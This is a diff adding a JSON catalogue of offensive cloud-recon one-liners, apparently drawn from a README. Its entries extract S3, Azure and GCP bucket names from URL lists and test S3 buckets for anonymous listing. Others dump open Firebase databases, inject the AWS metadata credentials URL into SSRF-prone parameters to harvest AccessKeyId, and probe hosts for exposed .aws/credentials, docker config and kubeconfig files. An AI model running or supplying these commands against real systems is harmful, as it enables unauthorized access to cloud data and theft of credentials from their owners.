@@ -1,0 +1,64 @@
+[
+    {
+        "title": "\u2601\ufe0f Cloud Security",
+        "class": "Cloud",
+        "tools": [],
+        "command_pattern": "cat urls.txt | grep -oE \"[a-zA-Z0-9.-]+\\.s3\\.amazonaws\\.com\" | anew s3_buckets.txt\ncat urls.txt | grep -oE \"s3://[a-zA-Z0-9.-]+\" | anew s3_buckets.txt",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\u2601\ufe0f Cloud Security",
+        "class": "Cloud",
+        "tools": [],
+        "command_pattern": "cat s3_buckets.txt | xargs -I@ sh -c 'aws s3 ls s3://@ --no-sign-request 2>/dev/null && echo \"OPEN: @\"'",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\u2601\ufe0f Cloud Security",
+        "class": "Cloud",
+        "tools": [],
+        "command_pattern": "cat urls.txt | grep -oE \"[a-zA-Z0-9-]+\\.firebaseio\\.com\" | xargs -I@ curl -s @/.json | grep -v \"null\"",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\u2601\ufe0f Cloud Security",
+        "class": "Cloud",
+        "tools": [],
+        "command_pattern": "cat urls.txt | grep -oE \"[a-zA-Z0-9-]+\\.blob\\.core\\.windows\\.net\" | anew azure_blobs.txt",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\u2601\ufe0f Cloud Security",
+        "class": "Cloud",
+        "tools": [],
+        "command_pattern": "cat urls.txt | grep -oE \"storage\\.googleapis\\.com/[a-zA-Z0-9-]+\" | anew gcp_buckets.txt",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\u2601\ufe0f Cloud Security",
+        "class": "Cloud",
+        "tools": [
+            "httpx",
+            "qsreplace",
+            "gf"
+        ],
+        "command_pattern": "cat urls.txt | gf ssrf | qsreplace \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" | httpx -silent -ms \"AccessKeyId\"",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\u2601\ufe0f Cloud Security",
+        "class": "Cloud",
+        "tools": [
+            "httpx"
+        ],
+        "command_pattern": "cat alive.txt | httpx -silent -path /.aws/credentials,/.docker/config.json,/kubeconfig -mc 200 | anew cloud_creds.txt",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    }
+]
